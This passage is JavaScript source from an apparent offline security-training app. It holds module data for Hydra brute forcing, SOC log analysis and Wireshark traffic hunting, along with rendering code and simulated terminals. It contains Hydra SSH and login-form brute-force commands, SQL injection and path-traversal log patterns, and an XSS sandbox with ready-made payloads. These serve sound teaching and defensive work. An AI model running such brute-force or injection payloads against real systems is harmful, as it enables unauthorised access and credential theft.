    { title: 'Using Username Lists', desc: 'Instead of a single username (<code>-l</code>), provide a file of usernames (<code>-L</code>). You can also create custom lists based on reconnaissance:', code: { lang: 'bash', text: '# Create a custom username list:\necho -e "admin\\nroot\\nadministrator\\nuser\\ntest" > users.txt\n\n# Use it with Hydra:\nhydra -L users.txt -P /usr/share/wordlists/rockyou.txt \\\n  ssh://192.168.1.1 -t 4' } },
    { title: 'Control Speed and Output', desc: 'Use <code>-t</code> for parallel tasks, <code>-w</code> for timeout, <code>-V</code> for verbose output (shows every attempt), and <code>-o</code> to save results:', code: { lang: 'bash', text: '# Verbose mode (see each attempt):\nhydra -l admin -P passwords.txt ssh://192.168.1.1 -V\n\n# Save results to file:\nhydra -l admin -P passwords.txt ssh://192.168.1.1 -o results.txt\n\n# Limit to 4 threads, 30s timeout:\nhydra -l admin -P passwords.txt ssh://192.168.1.1 -t 4 -w 30' } }
  ],

  defense: [
    { title: 'Account Lockout Policies', desc: 'Lock accounts after N failed attempts (e.g., 5 within 10 minutes). This dramatically slows brute force attacks. Implement progressive delays — first lockout for 5 minutes, then 30 minutes, then require admin unlock.' },
    { title: 'Multi-Factor Authentication (MFA)', desc: 'Even if the password is guessed, the attacker still needs the second factor (TOTP code, hardware key, push notification). MFA renders brute force attacks nearly useless.' },
    { title: 'Rate Limiting', desc: 'Limit login attempts per IP address and per account. Tools like fail2ban (Linux) can automatically ban IPs that exceed threshold attempts.' },
    { title: 'Strong Password Policies', desc: 'Require minimum length (12+ characters), check against known breached password lists (like HaveIBeenPwned), and encourage passphrases over complex character requirements.' },
    { title: 'CAPTCHA', desc: 'Add CAPTCHA challenges after 2-3 failed login attempts. This stops automated tools like Hydra from submitting forms at machine speed.' },
    { title: 'Monitor and Alert', desc: 'Log all failed login attempts. Set up alerts for anomalies — e.g., 100 failed logins from the same IP, or attempts against multiple usernames from the same source.' }
  ],

  payloads: { headers: ['Flag', 'Purpose', 'Example'], rows: [
    ['-l USER',      'Single target username',                              'hydra -l admin ...'],
    ['-L FILE',      'Username list file',                                  'hydra -L users.txt ...'],
    ['-p PASS',      'Single target password',                              'hydra -l admin -p password123 ...'],
    ['-P FILE',      'Password list file',                                  'hydra -P rockyou.txt ...'],
    ['-t N',         'Number of parallel threads (default 16)',             'hydra ... -t 4'],
    ['-w N',         'Timeout in seconds per connection attempt',           'hydra ... -w 30'],
    ['-V',           'Verbose — show every login attempt',                  'hydra ... -V'],
    ['-v',           'Verbose mode (less detail than -V)',                  'hydra ... -v'],
    ['-o FILE',      'Save found credentials to a file',                    'hydra ... -o results.txt'],
    ['-s PORT',      'Specify a custom port number',                        'hydra ... -s 8080'],
    ['-f',           'Stop after first valid credentials found',            'hydra ... -f'],
    ['ssh://',       'Target protocol prefix for SSH',                       'hydra -l root -P list.txt ssh://target'],
    ['ftp://',       'Target protocol prefix for FTP',                       'hydra -l admin -P list.txt ftp://target'],
    ['http-post-form','HTTP POST form brute force module',                  'hydra ... http-post-form "/login:u=^USER^&p=^PASS^:F=Failed"'],
    ['http-get-form', 'HTTP GET form brute force module',                   'hydra ... http-get-form "/login:u=^USER^&p=^PASS^:F=Failed"'],
    ['-e nsr',       'Try null password, same-as-login, and reversed login','hydra ... -e nsr'],
    ['-C FILE',      'Colon-separated "user:pass" combo file',             'hydra ... -C combos.txt ssh://target']
  ]}
},

{
  id: 'soc-simulator', track: 'blue', num: 'B1', short: 'soc',
  title: 'Blue Team SOC Analyst',
  subtitle: 'Defend the network! Monitor live traffic, spot the active exploit, and remediate the threat.',
  tag: 'Blue B1 — Defensive Simulation',

  concept: [
    `A <strong>Security Operations Center (SOC)</strong> is the central command post for a blue team. Analysts monitor network traffic, system logs, and intrusion detection alerts to identify and neutralize active threats in real-time.`,
    `When an attacker is running automated scripts (like Hydra or SQLmap) or manually testing payloads against your application, they leave a trail of breadcrumbs in the server's access logs.`,
    `Your job is to identify the <strong>Indicators of Compromise (IoCs)</strong>—such as anomalous traffic volumes, repetitive errors (401/403), or malicious signatures (like <code>UNION SELECT</code> or <code>../</code>) hidden within thousands of lines of benign web traffic.`
  ],

  analogy: { emoji: '🕵️', text: `Imagine you're the security guard watching hundreds of CCTV cameras simultaneously. Most people are just shopping (normal traffic), but one person is systematically trying the doorknob of every locked door in the building. Your job is to spot them and radio for backup before they find an open door.` },

  steps: [
    { title: 'Launch the Simulator', desc: 'Click the "Start SOC Simulator" button below to enter the live log analysis terminal.', code: null },
    { title: 'Monitor the Traffic Stream', desc: 'Watch the live access log feed. Normal traffic consists of GET requests to images, CSS files, and regular page routes returning 200 OK.', code: null },
    { title: 'Identify the Attack Vector', desc: 'Look for the specific IoCs listed in your Mission Objective panel. You are hunting for a malicious injection payload.', code: null },
    { title: 'Flag the Threat', desc: 'When you spot the malicious log line, click on it immediately to flag it as a threat vector.', code: null },
    { title: 'Apply Remediation', desc: 'Once the threat is successfully flagged, the Remediation Panel will unlock. Choose the correct defensive action to neutralize the attack.', code: null }
  ],

  defense: [
    { title: 'Web Application Firewalls (WAF)', desc: 'Deploy a WAF to automatically block requests containing known malicious signatures before they reach the application server.' },
    { title: 'Rate Limiting', desc: 'Implement strict rate limits on sensitive endpoints (like login forms) to thwart automated brute-force attacks.' },
    { title: 'Centralized Logging & SIEM', desc: 'Aggregate all application, server, and firewall logs into a SIEM (Security Information and Event Management) system for automated anomaly detection and alerting.' }
  ],

  payloads: { headers: ['Log Pattern', 'Attack Type', 'Description'], rows: [
    ['GET /login.php HTTP/1.1" 401', 'Brute Force', 'Repeated 401 Unauthorized responses to a login endpoint indicate credential stuffing.'],
    ['GET /api/users?id=1+UNION+SELECT', 'SQL Injection', 'The UNION keyword is a hallmark of SQL injection attempts.'],
    ['GET /image?file=../../../etc/passwd', 'Path Traversal', 'The ../ pattern attempts to escape the web root and read arbitrary system files.'],
    ['GET /search?q=&lt;script&gt;', 'XSS', 'Raw HTML/Script tags in URL parameters indicate Reflected XSS attempts.']
  ]}
},

// ─────────────────────────────────────────────────────────────────────────────
// BLUE B2: Network Traffic Analysis
// ─────────────────────────────────────────────────────────────────────────────
{
  id: 'net-analyst', track: 'blue', num: 'B2', short: 'net',
  title: 'Network Traffic Analysis',
  subtitle: 'Capture, decode, and analyze raw network packets to hunt for malware beacons, credential theft, and data exfiltration.',
  tag: 'Blue B2 — Network Forensics',

  concept: [
    `Every byte that travels across a network can be captured and inspected. <strong>Packet analysis</strong> is the art of reading these raw captures to reconstruct what happened during a security incident — or to catch an attack <em>in progress</em>.`,
    `<strong>Wireshark</strong> is the world's most popular network protocol analyzer. It decodes over 3,000 protocols from raw binary and presents them in a human-readable format. Security analysts use it to find plaintext credentials, malware C2 (command-and-control) beacons, DNS exfiltration, and unusual traffic patterns.`,
    `A key skill is <strong>filtering</strong>. A typical packet capture contains thousands of packets per second. Using display filters (like <code>http.request.method == "POST"</code> or <code>dns contains "evil.com"</code>), you can isolate exactly the traffic you care about.`,
    `On the command line, <strong>tcpdump</strong> is the lightweight alternative — perfect for capturing on headless servers or embedded devices where a GUI is unavailable.`
  ],

  analogy: { emoji: '🔬', text: `Think of packet analysis like reading every individual letter passing through a postal sorting facility. While most letters are birthday cards and bills (normal traffic), the analyst is looking for the one envelope containing a coded message to an overseas spy (a malware beacon). The key is filtering thousands of normal items to spot the one suspicious one.` },

  steps: [
    { title: 'Capture Traffic with Wireshark', desc: 'Open Wireshark and select your active network interface. Click the blue shark-fin to start a capture. You will immediately see a flood of packets. Stop the capture after 30 seconds.', code: { lang: 'filter', text: '# Wireshark Display Filter: Show only HTTP traffic\nhttp\n\n# Show only DNS queries\ndns\n\n# Filter by IP address\nip.addr == 192.168.1.105' } },
    { title: 'Hunt for Plaintext Credentials', desc: 'Many legacy protocols (FTP, Telnet, HTTP Basic Auth) transmit credentials in plain text. Use the filter below and then follow the TCP stream (Right-click → Follow → TCP Stream) to reconstruct the full session.', code: { lang: 'filter', text: '# Find FTP login attempts\nftp.request.command == "PASS"\n\n# Find HTTP Basic Auth\nhttp.authorization\n\n# Find POST form data (look for password= parameters)\nhttp.request.method == "POST"' } },
    { title: 'Detect DNS Exfiltration', desc: 'Attackers encode stolen data in DNS queries to bypass firewalls (since most networks allow DNS out). Look for abnormally long subdomain names, which indicate data is being tunneled.', code: { lang: 'filter', text: '# Show all DNS queries\ndns.flags.response == 0\n\n# Look for unusually long names (>50 chars = suspicious)\ndns.qry.name.len > 50\n\n# Suspicious example:\n# 6d616c77617265.exfil.evil.com  ← hex-encoded data in subdomain' } },
    { title: 'Identify Malware C2 Beacons', desc: 'Malware "phones home" to its command server at regular intervals (beaconing). Look for a host making connections to an external IP on unusual ports at perfectly regular intervals (e.g., exactly every 60 seconds).', code: { lang: 'filter', text: '# Filter traffic to a suspicious external IP\nip.dst == 13.37.13.37\n\n# Look for repeated connections to same port\ntcp.dstport == 4444 or tcp.dstport == 1337\n\n# Check for small, regular payloads (beacon pattern)\ntcp.len > 0 and tcp.len < 100' } },
    { title: 'Reconstruct an Attack with Follow Stream', desc: 'When you find a suspicious packet, right-click it and select <strong>Follow → TCP Stream</strong>. Wireshark will reconstruct the entire two-way conversation in a readable format, showing you the exact request and response — critical for understanding what data was stolen.', code: null },
    { title: 'Capture on the Command Line (tcpdump)', desc: 'When you cannot run Wireshark, use tcpdump. Always save to a .pcap file for later analysis in Wireshark.', code: { lang: 'bash', text: '# Capture all traffic on eth0, save to file\ntcpdump -i eth0 -w capture.pcap\n\n# Capture only HTTP traffic (port 80)\ntcpdump -i eth0 port 80 -w http_traffic.pcap\n\n# Read and display a saved capture\ntcpdump -r capture.pcap -n\n\n# Filter by host IP\ntcpdump -i eth0 host 192.168.1.105 -w suspect.pcap' } }
  ],

  defense: [
    { title: 'Encrypt All Traffic (TLS/HTTPS)', desc: 'TLS encryption makes packet capture useless — the attacker sees only encrypted ciphertext. Enforce TLS 1.3 with strong cipher suites. Never allow HTTP, FTP, or Telnet in production.' },
    { title: 'Network Segmentation', desc: 'Use VLANs and firewall rules to segment your network. If an attacker compromises one host, they cannot simply sniff traffic on other segments they are not part of.' },
    { title: 'Intrusion Detection Systems (IDS)', desc: 'Deploy an IDS like Snort or Suricata on your network tap/span port. These tools analyze live packet streams against known attack signatures and alert your SOC in real-time.' },
    { title: 'DNS Security (DNSSEC & DoH)', desc: 'Implement DNS over HTTPS (DoH) or DNS over TLS (DoT) to prevent DNS sniffing and manipulation. Monitor DNS logs for anomalously long query names that indicate data exfiltration.' }
  ],

  payloads: { headers: ['Filter / Command', 'Purpose', 'Risk Detected'], rows: [
    ['http.request.method == "POST"',   'Find all form submissions',          'Credential Theft'],
    ['ftp.request.command == "PASS"',   'Find FTP plaintext passwords',      'Credential Exposure'],
    ['dns.qry.name.len > 50',           'Detect DNS tunneling/exfiltration',  'Data Exfiltration'],
    ['tcp.dstport == 4444',             'C2 beacon on common RAT port',       'Malware'],
    ['http.authorization',              'Find Basic Auth credentials',         'Credential Theft'],
    ['icmp',                            'Ping sweeps / ICMP tunneling',       'Reconnaissance'],
    ['tcp.flags.syn == 1',              'SYN flood detection',                'DDoS'],
    ['ip.src == 10.0.0.X && dns',       'Internal host doing unusual DNS',    'Lateral Movement']
  ]}
},

// ─────────────────────────────────────────────────────────────────────────────
// BLUE B3: Defenses & Remediation (shell — content arrives in a later task)
// ─────────────────────────────────────────────────────────────────────────────
{
  id: 'defenses', track: 'blue', num: 'B3', short: 'defend',
  title: 'Defenses & Remediation',
  subtitle: 'The defensive fixes for each attack in the red-team path, collected in one place.',
  tag: 'Blue B3 — Hardening',

  concept: [
    `Every attack in the red-team path has a matching defence. This page will collect them so you can move from "how it breaks" to "how it is fixed".`
  ],

  analogy: { emoji: '🛡️', text: `A lock is only useful once you know how it gets picked. Learn the attack, then learn the fix.` },

  steps: [],

  payloads: { headers: ['Attack', 'Primary Defence', 'Risk Detected'], rows: [] }
}

]; // end MODULES

/* ═══════════════════════════════════════════════════════════════════════════════
   APPLICATION STATE & DOM
   ═══════════════════════════════════════════════════════════════════════════════ */

let activeModuleIndex = -1;

const sidebarNav   = document.getElementById('sidebarNav');
const contentArea  = document.getElementById('contentArea');

/* ═══════════════════════════════════════════════════════════════════════════════
   SIDEBAR NAVIGATION
   ═══════════════════════════════════════════════════════════════════════════════ */

const TRACK_LABELS = { red: 'red team', blue: 'blue team' };

function buildSidebar() {
  let lastTrack = null;
  MODULES.forEach((mod, i) => {
    if (mod.track !== lastTrack) {
      lastTrack = mod.track;
      const label = document.createElement('div');
      label.className = 'nav-section-label nav-track-label nav-track-' + mod.track;
      label.textContent = TRACK_LABELS[mod.track] || mod.track;
      sidebarNav.appendChild(label);
    }
    const item = document.createElement('div');
    item.className = 'nav-item';
    item.dataset.index = i;
    item.dataset.module = mod.id;
    item.title = mod.title;
    item.innerHTML = `
      <div class="nav-num">${mod.num}</div>
      <div class="nav-label">${escapeHtml(mod.short || mod.title)}</div>
    `;
    item.addEventListener('click', () => selectModule(i));
    sidebarNav.appendChild(item);
  });
}

/* ═══════════════════════════════════════════════════════════════════════════════
   HOME — module list + "continue" row, rendered from MODULES (pure helpers in home.js)
   ═══════════════════════════════════════════════════════════════════════════════ */

// The static home markup from index.html; renderModule replaces it, showHome restores it.
const HOME_HTML = contentArea.innerHTML;

function lastModuleStorage() {
  try { return window.localStorage; } catch (e) { return null; }
}

function renderHome() {
  const H = window.CCHome;
  const list = document.getElementById('homeModuleList');
  const cont = document.getElementById('homeContinue');
  if (!H || !list) return;

  const groups = H.trackGroups(MODULES);
  const total = groups.red.length + groups.blue.length;
  const delays = H.rowDelays(total + 1, 200);
  let n = 0;
  const rowHtml = (r) => `
    <button type="button" class="home-row fade-in" style="--i:${delays[++n]}ms" data-index="${r.index}" data-module="${escapeAttr(r.id)}">
      <span class="home-row-num">${escapeHtml(r.num)}</span>
      <span class="home-row-short">${escapeHtml(r.short)}</span>
      <span class="home-row-body">
        <span class="home-row-title">${escapeHtml(r.title)}</span>
        <span class="home-row-summary">${escapeHtml(r.summary)}</span>
      </span>
    </button>`;
  const groupHtml = (track, heading) => groups[track].length ? `
    <div class="home-group" data-track="${track}">
      <h4 class="home-group-label">${heading}</h4>
      ${groups[track].map(rowHtml).join('')}
    </div>` : '';
  list.innerHTML = groupHtml('red', 'red team path') + groupHtml('blue', 'blue team');
  list.querySelectorAll('.home-row').forEach((btn) => {
    btn.addEventListener('click', () => selectModule(Number(btn.dataset.index)));
  });

  if (!cont) return;
  const pick = H.pickContinue(MODULES, H.readLast(lastModuleStorage()));
  if (!pick) { cont.hidden = true; cont.onclick = null; return; }
  cont.querySelector('.home-continue-short').textContent = pick.module.short || pick.module.id;
  cont.querySelector('.home-continue-title').textContent = pick.module.title;
  cont.title = 'Continue: ' + pick.module.title;
  cont.onclick = () => selectModule(pick.index);
  cont.hidden = false;
}

function showHome() {
  stopSocSimulator();
  document.getElementById('socMode').style.display = 'none';
  contentArea.style.display = '';
  window.CCMotion && window.CCMotion.cancelAll();
  activeModuleIndex = -1;
  document.querySelectorAll('.nav-item').forEach((el) => el.classList.remove('active'));
  contentArea.innerHTML = HOME_HTML;
  contentArea.scrollTop = 0;
  renderHome();
}

function selectModuleById(moduleId) {
  const idx = MODULES.findIndex(m => m.id === moduleId);
  if (idx >= 0) selectModule(idx);
}

function stopSocSimulator() {
  if (socStreamInterval) { clearInterval(socStreamInterval); socStreamInterval = null; }
  socFlaggedScenario = null;
}

function exitSoc() {
  stopSocSimulator();
  document.getElementById('socMode').style.display = 'none';
  document.getElementById('contentArea').style.display = '';
}

function selectModule(index) {
  stopSocSimulator();
  document.getElementById('socMode').style.display = 'none';
  document.getElementById('contentArea').style.display = '';
  activeModuleIndex = index;
  window.CCHome && window.CCHome.writeLast(lastModuleStorage(), MODULES[index].id);
  document.querySelectorAll('.nav-item').forEach((el, i) => {
    el.classList.toggle('active', i === index);
  });
  renderModule(MODULES[index]);
}

/* ═══════════════════════════════════════════════════════════════════════════════
   MODULE RENDERER
   ═══════════════════════════════════════════════════════════════════════════════ */

function renderModule(mod) {
  contentArea.innerHTML = `
    <div class="module-header fade-in">
      <span class="module-tag">${mod.tag}</span>
      <h2 class="module-title">${mod.title}</h2>
      <p class="module-subtitle">${mod.subtitle}</p>
    </div>

    <!-- Core Concept -->
    <div class="section-card fade-in fade-in-delay-1">
      <div class="section-header">
        <div class="section-icon concept">${ICONS.concept}</div>
        <h3 class="section-title">${t('section_concept')}</h3>
      </div>
      <div class="section-body">
        ${mod.concept.map(p => `<p>${p}</p>`).join('')}
      </div>
    </div>

    <!-- Real-World Analogy -->
    <div class="section-card fade-in fade-in-delay-2">
      <div class="section-header">
        <div class="section-icon analogy">${ICONS.analogy}</div>
        <h3 class="section-title">${t('section_analogy')}</h3>
      </div>
      <div class="section-body">
        <div class="analogy-box">
          <span class="analogy-emoji">${mod.analogy.emoji}</span>
          <p>${mod.analogy.text}</p>
        </div>
      </div>
    </div>

    <!-- Hands-on Tutorial -->
    <div class="section-card fade-in fade-in-delay-3">
      <div class="section-header">
        <div class="section-icon exercise">${ICONS.exercise}</div>
        <h3 class="section-title">${t('section_steps')}</h3>
      </div>
      <div class="section-body">
        <ol class="step-list">
          ${mod.steps.map((step, i) => `
            <li class="step-item">
              <div class="step-num">${i + 1}</div>
              <div class="step-content">
                <h4>${step.title}</h4>
                <p>${step.desc}</p>
                ${step.code ? buildCodeBlock(step.code.lang, step.code.text) : ''}
              </div>
            </li>
          `).join('')}
        </ol>
      </div>
    </div>

    <!-- Defense & Remediation -->
    ${mod.defense ? `
    <div class="section-card fade-in fade-in-delay-4">
      <div class="section-header">
        <div class="section-icon defense">${ICONS.shield}</div>
        <h3 class="section-title">${t('section_defense')}</h3>
      </div>
      <div class="section-body">
        <ul class="defense-list">
          ${mod.defense.map(d => `
            <li class="defense-item">
              <div class="defense-icon-sm">${ICONS.shield}</div>
              <div class="defense-content">
                <h4>${d.title}</h4>
                <p>${d.desc}</p>
              </div>
            </li>
          `).join('')}
        </ul>
      </div>
    </div>
    ` : ''}

    <!-- Interactive Reference Table -->
    <div class="section-card fade-in fade-in-delay-5">
      <div class="section-header">
        <div class="section-icon reference">${ICONS.reference}</div>
        <h3 class="section-title">${t('section_reference')}</h3>
      </div>
      <div class="section-body">
        <div class="payload-table-wrap">
          <table class="payload-table">
            <thead>
              <tr>
                ${mod.payloads.headers.map(h => `<th>${h}</th>`).join('')}
                <th class="col-copy"></th>
              </tr>
            </thead>
            <tbody>
              ${mod.payloads.rows.map(row => `
                <tr>
                  <td><span class="cell-code">${escapeHtml(row[0])}</span></td>
                  <td>${row[1]}</td>
                  <td>${formatRisk(row[2])}</td>
                  <td>
                    <button class="cell-copy-btn" data-copy="${escapeAttr(row[0])}" title="Copy">
                      ${ICONS.copy}
                    </button>
                  </td>
                </tr>
              `).join('')}
            </tbody>
          </table>
        </div>
      </div>
    </div>
    
    <!-- Interactive Challenges -->
    <div class="section-card fade-in fade-in-delay-5" id="interactiveChallengesSection" style="display:none;">
      <div class="section-header">
        <div class="section-icon concept">${LI.target}</div>
        <h3 class="section-title">Interactive Challenges</h3>
      </div>
      <div class="section-body">
        <p>Put your skills to the test in the built-in offline labs and simulators. Follow an interactive step-by-step tutorial, or try to solve it on your own!</p>
        <div id="challengesList" class="challenges-list">
          <!-- Populated dynamically if tutorials exist for this module -->
        </div>
      </div>
    </div>
  `;

  // After rendering, check if there are tutorials for this module
  if (mod.id === 'soc-simulator') {
    document.getElementById('interactiveChallengesSection').style.display = 'block';
    const list = document.getElementById('challengesList');
    list.innerHTML = `
      <div class="challenge-row">
        <div class="challenge-info">
          <div class="challenge-name">Blue Team: Active Audit</div>
          <div class="challenge-desc">Enter the Security Operations Center to monitor live traffic and neutralize threats.</div>
        </div>
        <div class="challenge-actions">
          <button class="btn btn-boot" onclick="window.__app.startSocSimulator()">Start SOC Simulator</button>
        </div>
      </div>
    `;
  } else if (window.TUTORIALS) {
    const modsTuts = Object.entries(window.TUTORIALS).filter(([key, tut]) => tut.module === mod.id);

    if (modsTuts.length > 0) {
      document.getElementById('interactiveChallengesSection').style.display = 'block';
      const list = document.getElementById('challengesList');

      // ── Lab button lookup table — add new labs here, never touch the template ──
      const LAB_BTN_MAP = [
        { flag: 'requiresSQLiLab',            fn: 'openSQLiLab',               label: 'Launch SQLi Lab' },
        { flag: 'requiresHeaderManipulation',  fn: 'openHeaderManipulationLab', label: 'Launch Header Manipulation Lab' },
        { flag: 'requiresCookieManipulation',  fn: 'openCookieManipulationLab', label: 'Launch Cookie Manipulation Lab' },
        { flag: 'requiresPriceTampering',      fn: 'openPriceTamperingLab',     label: 'Launch Price Tampering Lab' },
        { flag: 'requiresBurpLab',             fn: 'openBurpLab',               label: 'Launch Burp Suite Lab' },
      ];

      function resolveLabButton(key, tut) {
        const match = LAB_BTN_MAP.find(e => tut[e.flag]);
        if (match) {
          return `<button class="btn btn-boot" onclick="window.labAPI.${match.fn}()">${match.label}</button>`;
        }
        return `<button class="btn btn-boot" onclick="window.__app.startTutorial('${key}')">Integrated Tutorial</button>`;
      }

      list.innerHTML = modsTuts.map(([key, tut]) => `
        <div class="challenge-row">
          <div class="challenge-info">
            <div class="challenge-name">${escapeHtml(tut.name)}</div>
            <div class="challenge-desc">${escapeHtml(tut.description)}</div>
          </div>
          <div class="challenge-actions">
            ${resolveLabButton(key, tut)}
          </div>
        </div>
      `).join('');
    }
  }

  if (mod.id === 'nmap') {
    const terminalHtml = `
      <div class="section-card fade-in fade-in-delay-6" id="nmapTerminalSection">
        <div class="section-header">
          <div class="section-icon concept">${LI.terminal}</div>
          <h3 class="section-title">Interactive Nmap Terminal</h3>
        </div>
        <div class="section-body">
          <p>Practice running Nmap commands in this simulated environment. Try commands like <code>nmap 127.0.0.1</code> or <code>nmap -sV localhost</code>.</p>
          <div id="nmapSimTerminal" class="terminal-window sim-terminal">
            <div id="nmapSimOutput" class="sim-output">CyberCompanion Nmap Simulator v1.0.0<br>Ready.</div>
            <div class="sim-input-row">
              <span class="sim-prompt">[user@cyber-lab ~]$</span>
              <input type="text" id="nmapSimInput" class="nmap-tut-target sim-input" autocomplete="off" spellcheck="false" placeholder="Type an nmap command here...">
            </div>
          </div>
        </div>
      </div>
    `;
    
    const challengesSection = document.getElementById('interactiveChallengesSection');
    if (challengesSection) {
      challengesSection.style.display = 'block';
      challengesSection.insertAdjacentHTML('afterend', terminalHtml);
    } else {
      document.getElementById('contentArea').insertAdjacentHTML('beforeend', terminalHtml);
    }
    
    setTimeout(() => {
      const inputEl = document.getElementById('nmapSimInput');
      if (inputEl) {
        inputEl.addEventListener('keydown', (e) => {
          if (e.key === 'Enter') {
            const cmd = inputEl.value.trim();
            if (cmd) window.__app.handleNmapCommand(cmd);
            inputEl.value = '';
          }
        });
      }
    }, 100);
  }

  if (mod.id === 'hydra') {
    const terminalHtml = `
      <div class="section-card fade-in fade-in-delay-6" id="hydraTerminalSection">
        <div class="section-header">
          <div class="section-icon concept">${LI.terminal}</div>
          <h3 class="section-title">Interactive Hydra Terminal</h3>
        </div>
        <div class="section-body">
          <p>Practice running Hydra brute force commands in this simulated environment. Try commands like <code>hydra -l admin -P rockyou.txt ssh://192.168.1.1</code>.</p>
          <div id="hydraSimTerminal" class="terminal-window sim-terminal">
            <div id="hydraSimOutput" class="sim-output">CyberCompanion Hydra Simulator v1.0.0
Hydra (THC) — Network Login Cracker
Ready. Type 'hydra' for usage help.</div>
            <div class="sim-input-row">
              <span class="sim-prompt">[user@cyber-lab ~]$</span>
              <input type="text" id="hydraSimInput" class="hydra-tut-target sim-input" autocomplete="off" spellcheck="false" placeholder="Type a hydra command here...">
            </div>
          </div>
        </div>
      </div>
    `;
    
    const challengesSection = document.getElementById('interactiveChallengesSection');
    if (challengesSection) {
      challengesSection.style.display = 'block';
      challengesSection.insertAdjacentHTML('afterend', terminalHtml);
    } else {
      document.getElementById('contentArea').insertAdjacentHTML('beforeend', terminalHtml);
    }
    
    setTimeout(() => {
      const inputEl = document.getElementById('hydraSimInput');
      if (inputEl) {
        inputEl.addEventListener('keydown', (e) => {
          if (e.key === 'Enter') {
            const cmd = inputEl.value.trim();
            if (cmd) window.__app.handleHydraCommand(cmd);
            inputEl.value = '';
          }
        });
      }
    }, 100);
  }

  // ── SQLmap Simulator ─────────────────────────────────────────────────────────
  if (mod.id === 'sqlmap') {
    const terminalHtml = `
      <div class="section-card fade-in fade-in-delay-6" id="sqlmapTerminalSection">
        <div class="section-header">
          <div class="section-icon concept">${LI.terminal}</div>
          <h3 class="section-title">Interactive SQLmap Terminal</h3>
        </div>
        <div class="section-body">
          <p>Practice SQLmap commands in this simulated environment. Try <code>sqlmap -u "http://target.com/vuln?id=1" --dbs</code> or type <code>sqlmap --help</code> for a full reference.</p>
          <div id="sqlmapSimTerminal" class="terminal-window sim-terminal is-tall">
            <div id="sqlmapSimOutput" class="sim-output">
<span class="sim-prompt">        ___\n       __H__\n ___ ___[)]_____ ___ ___  {1.7.12#stable}</span>\n|_ -| . [,]     | .'| . |\n|___|_  [.]_|_|_|__,|  _|\n      |_|V...       |_|   https://sqlmap.org\n\nCyberCompanion SQLmap Simulator v1.7\nType 'sqlmap --help' for usage, or start scanning.
            </div>
            <div class="sim-input-row">
              <span class="sim-prompt">[sqlmap]$</span>
              <input type="text" id="sqlmapSimInput" class="sim-input" autocomplete="off" spellcheck="false" placeholder="Type a sqlmap command...">
            </div>
          </div>
        </div>
      </div>
    `;
    const challengesSection = document.getElementById('interactiveChallengesSection');
    if (challengesSection) {
      challengesSection.style.display = 'block';
      challengesSection.insertAdjacentHTML('afterend', terminalHtml);
    } else {
      document.getElementById('contentArea').insertAdjacentHTML('beforeend', terminalHtml);
    }
    setTimeout(() => {
      const inputEl = document.getElementById('sqlmapSimInput');
      if (inputEl) {
        inputEl.addEventListener('keydown', (e) => {
          if (e.key === 'Enter') {
            const cmd = inputEl.value.trim();
            if (cmd) window.__app.handleSqlmapCommand(cmd);
            inputEl.value = '';
          }
        });
      }
    }, 100);
  }

  // ── XSS Sandbox Simulator ────────────────────────────────────────────────────
  if (mod.id === 'xss') {
    const xssHtml = `
      <div class="section-card fade-in fade-in-delay-6" id="xssLabSection">
        <div class="section-header">
          <div class="section-icon concept">${LI.flask}</div>
          <h3 class="section-title">XSS Injection Sandbox</h3>
        </div>
        <div class="section-body">
          <p>A <strong>safe, isolated</strong> practice environment. Type an XSS payload below and click <strong>Inject</strong> to see it execute inside the simulated page. Fully offline.</p>
          <div class="sim-stack sim-block">
            <div class="sim-out">
              <div class="sim-label">quick payloads</div>
              <div class="sim-chips">
                <button class="xss-payload-btn sim-chip" data-payload="&lt;script&gt;alert('XSS')&lt;/script&gt;">&lt;script&gt;alert()&lt;/script&gt;</button>
                <button class="xss-payload-btn sim-chip" data-payload="&lt;img src=x onerror=alert('IMG XSS')&gt;">&lt;img onerror&gt;</button>
                <button class="xss-payload-btn sim-chip" data-payload="&lt;svg onload=alert('SVG XSS')&gt;">&lt;svg onload&gt;</button>
                <button class="xss-payload-btn sim-chip" data-payload="&lt;iframe src=javascript:alert('iframe XSS')&gt;">&lt;iframe src=js:&gt;</button>
                <button class="xss-payload-btn sim-chip" data-payload="&lt;body onload=alert('Body XSS')&gt;">&lt;body onload&gt;</button>
                <button class="xss-payload-btn sim-chip" data-payload="&lt;script&gt;document.body.style.background='red'&lt;/script&gt;">Defacement</button>
              </div>
            </div>
            <div class="sim-row">
              <input type="text" id="xssPayloadInput" class="sim-field" placeholder="Type or paste your XSS payload here..." autocomplete="off">
              <button id="xssInjectBtn" class="btn btn-primary">Inject</button>
              <button id="xssClearBtn" class="btn btn-secondary">Clear</button>
            </div>
            <div id="xssResult" class="sim-result" style="display:none;"></div>
          </div>
          <div class="sim-browser">
            <div class="sim-panel-bar">
              <div class="sim-dots"><span class="terminal-dot red"></span><span class="terminal-dot yellow"></span><span class="terminal-dot green"></span></div>
              <span>vulnerable page — http://simulated-target.local/search</span>
            </div>
            <iframe id="xssSandboxFrame" sandbox="allow-scripts allow-modals" srcdoc="&lt;html&gt;&lt;body style='font-family:Arial,sans-serif; padding:20px; background:#f8f8f8;'&gt;&lt;h3 style='color:#333;'&gt;🛍️ VulnShop — Product Search&lt;/h3&gt;&lt;div style='background:#fff; border:1px solid #ddd; padding:10px; border-radius:4px;'&gt;&lt;input type='text' placeholder='Search products...' style='width:80%;padding:6px;border:1px solid #ccc;border-radius:3px;'&gt; &lt;button style='padding:6px 14px;background:#e74c3c;color:#fff;border:none;border-radius:3px;cursor:pointer;'&gt;Search&lt;/button&gt;&lt;/div&gt;&lt;p style='color:#777;font-size:13px;margin-top:10px;'&gt;Showing results for: &lt;span id='search-result'&gt;(nothing yet)&lt;/span&gt;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;"></iframe>
          </div>
          <p class="sim-caption">Note: this sandbox uses a restricted iframe. Real payloads that steal cookies or make network requests won't work here (by design), but injection execution will be visible.</p>
        </div>
      </div>
    `;
    const challengesSection = document.getElementById('interactiveChallengesSection');
    if (challengesSection) {
      challengesSection.style.display = 'block';
      challengesSection.insertAdjacentHTML('afterend', xssHtml);
    } else {
      document.getElementById('contentArea').insertAdjacentHTML('beforeend', xssHtml);
    }
    setTimeout(() => {
      const payloadInput = document.getElementById('xssPayloadInput');
      const injectBtn = document.getElementById('xssInjectBtn');
      const clearBtn = document.getElementById('xssClearBtn');
      const frame = document.getElementById('xssSandboxFrame');
      const resultEl = document.getElementById('xssResult');

      // Quick payload buttons
      document.querySelectorAll('.xss-payload-btn').forEach(btn => {
        btn.addEventListener('click', () => {
          if (payloadInput) payloadInput.value = btn.dataset.payload;
        });
      });

      function injectPayload() {
        const raw = payloadInput ? payloadInput.value.trim() : '';
        if (!raw) return;
